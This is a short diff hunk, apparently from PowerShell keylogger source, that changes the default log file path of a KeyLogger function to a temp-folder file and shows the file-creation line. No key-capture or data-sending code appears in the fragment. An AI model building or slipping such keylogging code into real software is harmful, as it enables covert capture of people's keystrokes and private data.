@@ -1,6 +1,6 @@
 
 # keylogger
-function KeyLogger($logFile="$env:temp/$env:UserName.log") {
+function KeyLogger($logFile="$env:temp/keylogger.log") {
 
   # generate log file
   $generateLog = New-Item -Path $logFile -ItemType File -Force
